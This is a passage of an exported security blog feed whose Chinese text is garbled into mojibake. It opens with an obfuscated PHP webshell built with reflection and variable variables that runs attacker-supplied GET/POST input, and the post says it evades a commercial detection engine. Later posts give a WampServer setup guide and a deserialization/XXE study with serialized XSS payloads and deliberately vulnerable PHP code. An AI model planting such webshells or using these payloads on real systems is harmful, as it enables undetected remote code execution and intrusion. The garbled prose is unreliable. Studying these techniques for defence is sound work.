class="line">$refl = <span class="keyword">new</span> ReflectionClass(<span class="string">'Test'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($refl-&gt;getConstants() <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $key =&gt; $value1) &#123;</span><br><span class="line">        $value2.=$value1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$value2($_value);</span><br></pre></td></tr></table></figure>
<p><img src="D5.png" alt=""></p>
<h2 id="ç±»ä¸ç»§æ‰¿"><a href="#ç±»ä¸ç»§æ‰¿" class="headerlink" title="ç±»ä¸ç»§æ‰¿"></a>ç±»ä¸ç»§æ‰¿</h2><p>Pç‰›çš„ã€ŠPHPåŠ¨æ€ç‰¹æ€§çš„æ•æ‰ä¸é€ƒé€¸ã€‹ä¸­æåˆ°äº†ä¸€ä¸ªç‚¹ï¼Œ</p>
<p><img src="php.png" alt=""></p>
<p>é™¤äº†PPTé‡Œæåˆ°çš„trickï¼Œè¿˜èƒ½æƒ³åˆ°ä»€ä¹ˆå‘¢ï¼Ÿ</p>
<ul>
<li>é¢å‘å¯¹è±¡ä¸­ï¼Œç±»èƒ½å¤Ÿç»§æ‰¿ç±»çš„å±æ€§ä¸æ–¹æ³•ã€‚æˆ–è®¸å¯ä»¥ä»è¿™ä¸¤ä¸ªç‚¹å…¥æ‰‹ï¼Œå› ä¸ºæµ‹è¯•ç»•è¿‡äº†â€ç‰§äº‘â€ï¼Œå°±æš‚æ—¶ä¸æ”¾å‡ºæ¥ç»“æœäº†ã€‚<br>è‡³äºä¸ºä»€ä¹ˆå¯ä»¥ç»•è¿‡ï¼šæˆ‘çš„çŒœæƒ³æ˜¯è¿™ä¸ªå‡½æ•°ä¸åœ¨é»‘åå•ä¸­ï¼Œè¯­æ³•åˆ†æä¸å¤Ÿå®Œå–„ï¼Œå¼•æ“è®¤ä¸ºæˆ‘ä»¬çš„vulnä»£ç å¹¶ä¸èƒ½æ‰§è¡Œã€‚</li>
</ul>
<p><img src="result1.gif" alt=""></p>
<h2 id="åˆ›å»ºç±»çš„å®ä¾‹"><a href="#åˆ›å»ºç±»çš„å®ä¾‹" class="headerlink" title="åˆ›å»ºç±»çš„å®ä¾‹"></a>åˆ›å»ºç±»çš„å®ä¾‹</h2><p><code>public ReflectionClass::newInstance( mixed $args[, mixed $...] ) : object</code><br>ç®€å•åœ°è¯´ï¼Œè¿™ä¸ªæ–¹æ³•å¯ä»¥åˆ›å»ºä¸€ä¸ªç±»çš„å®ä¾‹ï¼ŒåŒæ—¶è¯¥å‡½æ•°ä¼ é€’çš„å‚æ•°ä¼šä¼ é€’åˆ°è¯¥ç±»çš„æ„é€ å‡½æ•°<br>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¯¥æ–¹æ³•ä¼ å‚å’Œ<code>call_user_func()</code>ç›¸ä¼¼ï¼Œä¸èƒ½ä½¿ç”¨å¼•ç”¨ç±»å‹ä¼ å‚ï¼Œå¦‚æœè¦ä½¿ç”¨å¼•ç”¨ç±»å‹ä½¿ç”¨å¦ä¸€ä¸ªæ–¹æ³•<code>newInstanceArgs</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($para)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//assert</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class1 = <span class="keyword">new</span> ReflectionClass(<span class="string">"Test1"</span>);</span><br><span class="line">$para = <span class="string">''</span>;</span><br><span class="line"><span class="comment">//å¯æ§çš„$para</span></span><br><span class="line">$class2 = $class1-&gt;newInstance($para);</span><br></pre></td></tr></table></figure>
<p>åŸºæœ¬çš„æ¡†æ¶å°±æ˜¯è¿™æ ·äº†ï¼Œå¯¹æ¡†æ¶è¿›è¡Œå˜å½¢ä¹Ÿå¯ç»•è¿‡â€ç‰§äº‘â€ã€‚</p>
<p><img src="result2.gif" alt=""></p>
]]></content>
      <categories>
        <category>Webshell</category>
      </categories>
      <tags>
        <tag>Webshellå…æ€</tag>
      </tags>
  </entry>
  <entry>
    <title>test</title>
    <url>/2019/10/28/test/</url>
    <content><![CDATA[<h1 id="It-is-a-Test-Page"><a href="#It-is-a-Test-Page" class="headerlink" title="It is a Test Page"></a>It is a Test Page</h1><p>Hello World<br>æœ€åç¼–è¾‘äº2020.5.14</p>
<a id="more"></a>
<p>:)</p>
]]></content>
  </entry>
  <entry>
    <title>è®°ä¸€æ¬¡åœ¨wamper64ä¸­å¢åŠ phpé‡åˆ°çš„é—®é¢˜</title>
    <url>/2020/01/31/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%9C%A8wamper64%E4%B8%AD%E5%A2%9E%E5%8A%A0php%E7%89%88%E6%9C%AC%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/</url>
    <content><![CDATA[<p>åœ¨wamper64ä¸­æ‰‹åŠ¨å¢åŠ phpç‰ˆæœ¬ç¢°åˆ°äº†ä¸å°‘é—®é¢˜ï¼Œè®°å½•æ€»ç»“ä¸€ä¸‹</p>
<a id="more"></a>
<h1 id="åŸå› "><a href="#åŸå› " class="headerlink" title="åŸå› "></a>åŸå› </h1><p>å› ä¸ºè¦å¤ç°joomla3.4.6çš„ä¸€ä¸ªRCEï¼Œphpè¦æ±‚åœ¨5.6.13ä¸‹æ‰è¡Œï¼Œæˆ‘çš„wamperè‡ªå¸¦çš„php5åªæœ‰5.6.40ï¼Œæ‰€ä»¥éœ€è¦æˆ‘æ‰‹åŠ¨å®‰è£…ä¸€ä¸ªä½ç‰ˆæœ¬</p>
<h1 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h1><p>ä¸€å¼€å§‹æˆ‘æ‰¾æˆ‘çš„å°ä¼™ä¼´è¦äº†ä»–çš„phpstudyä¸‹çš„php5.3.29ï¼ŒæŒ‰ç…§ç½‘ä¸Šçš„æ–¹æ³•é…ç½®å¥½åwamperæ˜¯æ©˜è‰²çš„ï¼Œä¸€çœ‹æœç„¶æœ‰ä¸ªæœåŠ¡æ²¡å¯åŠ¨ï¼Œäºæ˜¯æˆ‘æŸ¥çœ‹åå‘ç°æ˜¯apacheæ²¡æœ‰æ­£å¸¸å¯åŠ¨ï¼Œ<br>æŸ¥çœ‹äº†ä¸€ä¸‹é”™è¯¯æ—¥å¿—åå‘ç°æ˜¯phpç›®å½•ä¸‹çš„wampserver.confæ–‡ä»¶å†…å®¹å‡ºäº†é—®é¢˜<br>æœ€åå®šä½åˆ°ç¬¬9è¡Œï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phpConf[<span class="string">'phpIniDir'</span>] = <span class="string">'.'</span>;</span><br><span class="line">$phpConf[<span class="string">'phpExeDir'</span>] = <span class="string">'.'</span>;</span><br><span class="line">$phpConf[<span class="string">'phpConfFile'</span>] = <span class="string">'php.ini'</span>;</span><br><span class="line"><span class="comment">//PHP 5.6.x needs Apache 2.4.x and doesn't works with Apache 2.2.x</span></span><br><span class="line"><span class="comment">//$phpConf['apache']['2.2']['LoadModuleName'] = 'php5_module';</span></span><br><span class="line"><span class="comment">//$phpConf['apache']['2.2']['LoadModuleFile'] = 'php5apache2_2.dll';</span></span><br><span class="line"><span class="comment">//$phpConf['apache']['2.2']['AddModule'] =  '';</span></span><br><span class="line">$phpConf[<span class="string">'apache'</span>][<span class="string">'2.4'</span>][<span class="string">'LoadModuleName'</span>] = <span class="string">'php5_module'</span>;</span><br><span class="line">$phpConf[<span class="string">'apache'</span>][<span class="string">'2.4'</span>][<span class="string">'LoadModuleFile'</span>] = <span class="string">'php5apache2_4.dll'</span>;</span><br><span class="line">$phpConf[<span class="string">'apache'</span>][<span class="string">'2.4'</span>][<span class="string">'AddModule'</span>] =  <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li>æ˜¾ç„¶æ˜¯php5apache2_2.dllè¿™ä¸ªdllåŠ è½½å¤±è´¥äº†ã€‚æˆ‘æƒ³èµ·å°ä¼™ä¼´ä¼ ç»™æˆ‘çš„phpæ–‡ä»¶é‡Œæ˜¯æ²¡æœ‰è¿™ä¸ªdllçš„ï¼Œè¿™ä¸ªdllæ˜¯æˆ‘ä»è‡ªå·±çš„php5.6.40æ‹·è´è¿‡æ¥çš„ï¼Œæˆ‘ä»”ç»†çœ‹äº†ä¸€ä¸‹ä»–ä¼ ç»™æˆ‘çš„æ–‡ä»¶å«ï¼š<code>php5.3.29nts.rar</code>ï¼Œæˆ‘å»æŸ¥äº†ä¸€ä¸‹ntsçš„å«ä¹‰ï¼Œæœç„¶æ˜¯phpç‰ˆæœ¬çš„é—®é¢˜ï¼Œå®˜æ–¹çš„è§£é‡Šæ˜¯è¿™æ ·çš„ï¼š<br>NTSå…¨ç§°ï¼š<code>Non Thread Safe</code>ï¼ŒTSæ˜¯æŒ‡å…·æœ‰å¤šçº¿ç¨‹åŠŸèƒ½çš„æ„å»ºã€‚NTSä»…æŒ‡å•çº¿ç¨‹æ„å»ºã€‚TSäºŒè¿›åˆ¶æ–‡ä»¶çš„ç”¨ä¾‹æ¶‰åŠä¸å¤šçº¿ç¨‹SAPIå’Œä½œä¸ºæ¨¡å—åŠ è½½åˆ°WebæœåŠ¡å™¨çš„PHPçš„äº¤äº’ã€‚å¯¹äºNTSäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¿æ³›çš„ç”¨ä¾‹æ˜¯é€šè¿‡FastCGIåè®®ä¸WebæœåŠ¡å™¨è¿›è¡Œäº¤äº’ï¼Œè€Œä¸ä½¿ç”¨å¤šçº¿ç¨‹ï¼ˆä¾‹å¦‚CLIï¼‰ã€‚</li>
<li>å¦‚æœä½ è¦ä½¿ç”¨apacheï¼Œåˆ™éœ€è¦ä½¿ç”¨TSç‰ˆæœ¬ï¼›å¦‚æœæ˜¯IISï¼Œåˆ™ä½¿ç”¨NTSç­‰ç­‰<br>æ‰€ä»¥æˆ‘åˆå»ä¸‹äº†ä¸€ä¸ª5.3.29TSç‰ˆæœ¬ï¼Œä¸‹è½½å¥½å®‰è£…å®Œæˆï¼Œå´å‘ç°ç›®å½•ä¸‹æ²¡æœ‰<code>php5apache2_4.dll</code>è€Œæ˜¯<code>php5apache2_2.dll</code>ï¼Œåæ¥æˆ‘çœ‹åˆ°wampserver.confä¸‹ç¬¬7è¡Œï¼š<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//PHP 5.6.x needs Apache 2.4.x and doesn&apos;t works with Apache 2.2.x</span><br></pre></td></tr></table></figure>
è€Œä¸”æˆ‘çš„wamperä¸­åªæœ‰ä¸€ä¸ªapache2.4ç‰ˆæœ¬çš„ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°ä¸‹ä¸ªç‰ˆæœ¬ç¨é«˜ç‚¹çš„</li>
</ul>
<h1 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h1><p>æ€»ç»“ä¸€ä¸‹éœ€è¦æ›´æ”¹çš„é…ç½®æ–‡ä»¶</p>
<ol>
<li>å°†ä½ çš„ä»»æ„ç‰ˆæœ¬phpä¸‹çš„php.iniå¤åˆ¶åˆ°æ–°phpç›®å½•ä¸‹ï¼Œå¹¶æ›¿æ¢å…¶ä¸­çš„ç‰ˆæœ¬å·</li>
<li>(æœ¬ä¾‹ä¸­)å°†php5ç‰ˆæœ¬ä¸‹çš„wampserver.confå¤åˆ¶åˆ°æ–°phpç›®å½•ä¸‹ï¼Œå…·ä½“æ”¹çš„åœ°æ–¹è¦çœ‹å®é™…æƒ…å†µ</li>
<li>å°†ä½ çš„ä»»æ„ç‰ˆæœ¬phpä¸‹çš„phpForApache.iniå¤åˆ¶åˆ°æ–°phpç›®å½•ä¸‹ï¼Œæ›¿æ¢å…¶ä¸­çš„ç‰ˆæœ¬å·</li>
<li>æ‰“å¼€wamperçš„é…ç½®æ–‡ä»¶<code>{wamperå®‰è£…è·¯å¾„}/wampmanager.ini</code>ï¼Œå…¨å±€æœç´¢<code>[phpversion]</code></li>
</ol>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="section">[phpVersion]</span></span><br><span class="line"><span class="comment">;WAMPPHPVERSIONSTART</span></span><br><span class="line">Type: item; Caption: "5.6.11"; Action: multi; Actions:switchPhp5.6.11; Glyph: 13</span><br><span class="line">Type: item; Caption: "5.6.40"; Action: multi; Actions:switchPhp5.6.40</span><br><span class="line">Type: item; Caption: "7.0.33"; Action: multi; Actions:switchPhp7.0.33</span><br><span class="line">Type: item; Caption: "7.1.29"; Action: multi; Actions:switchPhp7.1.29</span><br><span class="line">Type: item; Caption: "7.2.18"; Action: multi; Actions:switchPhp7.2.18</span><br><span class="line">Type: item; Caption: "7.3.5"; Action: multi; Actions:switchPhp7.3.5</span><br><span class="line"><span class="section">[switchPhp5.6.11]</span></span><br><span class="line">Action: service; Service: wampapache64; ServiceAction: stop; Flags: ignoreerrors waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php-win.exe";Parameters: "switchPhpVersion.php 5.6.11";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php.exe";Parameters: "switchMysqlPort.php 3306";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php-win.exe";Parameters: "refresh.php";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "net"; Parameters: "start wampapache64"; ShowCmd: hidden; Flags: waituntilterminated</span><br><span class="line">Action: resetservices</span><br><span class="line">Action: readconfig</span><br><span class="line"><span class="section">[switchPhp5.6.40]</span></span><br><span class="line">Action: service; Service: wampapache64; ServiceAction: stop; Flags: ignoreerrors waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php-win.exe";Parameters: "switchPhpVersion.php 5.6.40";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php.exe";Parameters: "switchMysqlPort.php 3306";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php-win.exe";Parameters: "refresh.php";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "net"; Parameters: "start wampapache64"; ShowCmd: hidden; Flags: waituntilterminated</span><br><span class="line">Action: resetservices</span><br><span class="line">Action: readconfig</span><br><span class="line"><span class="section">[switchPhp7.0.33]</span></span><br><span class="line">Action: service; Service: wampapache64; ServiceAction: stop; Flags: ignoreerrors waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php-win.exe";Parameters: "switchPhpVersion.php 7.0.33";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php.exe";Parameters: "switchMysqlPort.php 3306";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php-win.exe";Parameters: "refresh.php";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "net"; Parameters: "start wampapache64"; ShowCmd: hidden; Flags: waituntilterminated</span><br><span class="line">Action: resetservices</span><br><span class="line">Action: readconfig</span><br></pre></td></tr></table></figure>

<ul>
<li><p>åœ¨<code>;WAMPPHPVERSIONSTART</code>ä¸‹æ–¹æ’å…¥:<code>Type: item; Caption: &quot;{ä½ çš„ç‰ˆæœ¬å·}}&quot;; Action: multi; Actions:switchPhp{ä½ çš„ç‰ˆæœ¬å·}</code></p>
</li>
<li><p>æ¥ä¸‹æ¥åœ¨<code>[switchPhpx.x.xx]</code>å‰æ’å…¥</p>
</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="section">[switchPhp&#123;ä½ çš„ç‰ˆæœ¬å·&#125;]</span></span><br><span class="line">Action: service; Service: wampapache64; ServiceAction: stop; Flags: ignoreerrors waituntilterminated</span><br><span class="line">Action: run; FileName: "&#123;å®‰è£…è·¯å¾„&#125;/php/php&#123;ä½ çš„ç‰ˆæœ¬å·&#125;/php-win.exe";Parameters: "switchPhpVersion.php &#123;ä½ çš„ç‰ˆæœ¬å·&#125;";WorkingDir: "&#123;å®‰è£…è·¯å¾„&#125;scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "&#123;å®‰è£…è·¯å¾„&#125;/bin/php/php&#123;ä½ çš„ç‰ˆæœ¬å·&#125;/php.exe";Parameters: "switchMysqlPort.php 3306";WorkingDir: "&#123;å®‰è£…è·¯å¾„&#125;/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "&#123;å®‰è£…è·¯å¾„&#125;/bin/php/php&#123;ä½ çš„ç‰ˆæœ¬å·&#125;/php-win.exe";Parameters: "refresh.php";WorkingDir: "&#123;å®‰è£…è·¯å¾„&#125;/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "net"; Parameters: "start wampapache64"; ShowCmd: hidden; Flags: waituntilterminated</span><br><span class="line">Action: resetservices</span><br><span class="line">Action: readconfig</span><br></pre></td></tr></table></figure>

<ul>
<li>æ›´æ”¹å®Œæˆåé€€å‡ºwamper64ï¼Œç„¶åé‡å¯å„é¡¹æœåŠ¡å°±ğŸ†—äº†</li>
</ul>
]]></content>
      <categories>
        <category>apache</category>
      </categories>
      <tags>
        <tag>wamper64</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPååºåˆ—åŒ–å’ŒXXEçš„å­¦ä¹ </title>
    <url>/2020/06/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CXXE/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ€è¿‘åœ¨å­¦ä¹ çš„æ—¶å€™çœ‹äº†ä¸€ä¸ªå¸ˆå‚…çš„åšå®¢ï¼Œé‡Œé¢æåˆ°çš„çŸ¥è¯†ç‚¹å¯ä»¥æ‰©å¤§æˆ‘ä»¬çš„æ”»å‡»é¢ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹è‡ªå·±å¯¹è¿™äº›çŸ¥è¯†ç‚¹çš„ç†è§£å’Œè¿ç”¨</p>
<a id="more"></a>
<h1 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h1><p>è¿™å’Œæˆ‘ä»¬å¹³æ—¶é‡åˆ°çš„ååºåˆ—åŒ–åˆ©ç”¨ä¸åŒï¼Œåœ¨ä¸èƒ½ä½¿ç”¨pharåè®®è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ï¼Œé€šå¸¸æˆ‘ä»¬æŒ–æ˜ååºåˆ—åŒ–POPé“¾æ—¶çš„éœ€è¦çš„æ¡ä»¶ï¼š</p>
<ol>
<li>å­˜åœ¨å¯æ§çš„ååºåˆ—åŒ–å‚æ•°</li>
<li>ç¨‹åºä¸­å­˜åœ¨å¯ç”¨çš„ç±»å¹¶ä¸”å­˜åœ¨<code>wakeup()</code>æˆ–<code>destruct()</code>é­”æ³•å‡½æ•°</li>
<li>è¯¥ç±»åœ¨é­”æ³•å‡½æ•°ä¸­èƒ½å¦åœ¨å½“å‰è°ƒç”¨ä¸­è§¦å‘</li>
</ol>
<ul>
<li>å¦‚æœå½“å‰ç¨‹åºä¸­ä¸å­˜åœ¨æˆ‘ä»¬å¯ç”¨çš„ç±»ï¼Œé‚£æˆ‘ä»¬çš„POPé“¾å°±æ–­äº†ã€‚<h2 id="PHPå¯ç”¨çš„ååºåˆ—åŒ–åŸç”Ÿç±»"><a href="#PHPå¯ç”¨çš„ååºåˆ—åŒ–åŸç”Ÿç±»" class="headerlink" title="PHPå¯ç”¨çš„ååºåˆ—åŒ–åŸç”Ÿç±»"></a>PHPå¯ç”¨çš„ååºåˆ—åŒ–åŸç”Ÿç±»</h2></li>
</ul>
<ol>
<li>Error<br>Errorç±»å°±æ˜¯phpçš„ä¸€ä¸ªå†…ç½®ç±»ç”¨äºè‡ªåŠ¨è‡ªå®šä¹‰ä¸€ä¸ªErrorï¼Œåœ¨php7çš„ç¯å¢ƒä¸‹å¯èƒ½ä¼šé€ æˆä¸€ä¸ªxssæ¼æ´ï¼ŒåŸå› æ˜¯è¯¥ç±»å­˜åœ¨ä¸€ä¸ª<code>__toString</code>æ–¹æ³•ï¼Œæˆ‘ä»¬æ¥å¤ä¹ ä¸€ä¸‹<code>__toString</code>æ–¹æ³•ã€‚<h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h2><code>__toString()</code>ï¼šå½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨ã€‚æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†å‘å‡ºä¸€æ¡<code>E_RECOVERABLE_ERROR</code>çº§åˆ«çš„è‡´å‘½é”™è¯¯ã€‚<blockquote>
<p>å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨æ—¶å€™ä¼šè§¦å‘ã€‚</p>
</blockquote>
</li>
</ol>
<ul>
<li>ç”±äºphpçš„è¯­è¨€ç‰¹æ€§ï¼Œphpä¸€äº›å‡½æ•°ä¼šè‡ªåŠ¨å®Œæˆç±»å‹è½¬æ¢ï¼Œä¸‹é¢æ˜¯<code>__toString()</code>æ–¹æ³•çš„è§¦å‘æ¡ä»¶</li>
</ul>
<ol>
<li>echo ($obj) / print($obj) æ‰“å°æ—¶ä¼šè§¦å‘</li>
<li>ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿æ¥æ—¶</li>
<li>ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶</li>
<li>ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿›è¡Œ<code>==</code>æ¯”è¾ƒæ—¶ï¼ˆ<strong>PHPè¿›è¡Œ==æ¯”è¾ƒçš„æ—¶å€™ä¼šè½¬æ¢å‚æ•°ç±»å‹</strong>ï¼‰</li>
<li>ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–SQLè¯­å¥ï¼Œç»‘å®šå‚æ•°æ—¶</li>
<li>ååºåˆ—åŒ–å¯¹è±¡åœ¨ç»è¿‡phpå­—ç¬¦ä¸²å‡½æ•°ï¼Œå¦‚ strlen()ã€addslashes()æ—¶</li>
<li>åœ¨in_array()æ–¹æ³•ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ååºåˆ—åŒ–å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„æ•°ç»„ä¸­æœ‰toStringè¿”å›çš„å­—ç¬¦ä¸²çš„æ—¶å€™toStringä¼šè¢«è°ƒç”¨</li>
<li>ååºåˆ—åŒ–çš„å¯¹è±¡ä½œä¸º class_exists() çš„å‚æ•°çš„æ—¶å€™<br>æ‰€ä»¥ç»“æœå¾ˆæ˜¾ç„¶äº†ï¼Œæˆ‘ä»¬å†™ä¸€ä¸ªdemoæ¥æµ‹è¯•ä¸€ä¸‹æ˜¯å¦èƒ½è§¦å‘XSSï¼Œå°±æ‹¿æˆ‘ä¸Šç¯‡laravelååºåˆ—åŒ–çš„demoæ¥æµ‹è¯•ä¸€ä¸‹<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Test</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Controller</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Test</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;   <span class="comment">//test unserialize</span></span><br><span class="line">        $code = $_GET[<span class="string">'c'</span>];</span><br><span class="line">        unserialize($code);</span><br><span class="line">        <span class="keyword">echo</span> $code;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>POC<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> Error(<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
å¯ä»¥çœ‹åˆ°æˆåŠŸå¼¹çª—<br><img src="xss1.png" alt="xss1"></li>
</ul>
<ol start="2">
<li>Exception<br>è¿™ä¸ªç±»åˆ©ç”¨çš„æ–¹å¼å’ŒåŸç†å’Œ<code>Error</code>ç±»ä¸€æ ·ï¼Œä¸åŒæ˜¯å®ƒé€‚ç”¨äºPHP5å’ŒPHP7ï¼Œæ‰€ä»¥æ›´å¥½ç”¨</li>
</ol>
<ul>
<li>POC<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
å¼¹çª—æˆåŠŸ<br><img src="xss2.png" alt="xss2"></li>
</ul>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>ä¸‹é¢çš„ä»£ç æ¥æºäº<a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">PHP SECURITY CALENDAR 2017</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $template;</span><br><span class="line">    <span class="keyword">private</span> $variables;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($template, $variables)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;template = $template;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;variables = $variables;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;variables[<span class="string">'new'</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering new response'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering old response'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($className)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> $className;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$controllerName = $_GET[<span class="string">'c'</span>]; <span class="comment">//HomeController</span></span><br><span class="line">$data = $_GET[<span class="string">'d'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (class_exists($controllerName)) &#123;</span><br><span class="line">    $controller = <span class="keyword">new</span> $controllerName($data[<span class="string">'t'</span>], $data[<span class="string">'v'</span>]);</span><br><span class="line">    $controller-&gt;render();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'There is no page with this name'</span>;</span><br><span 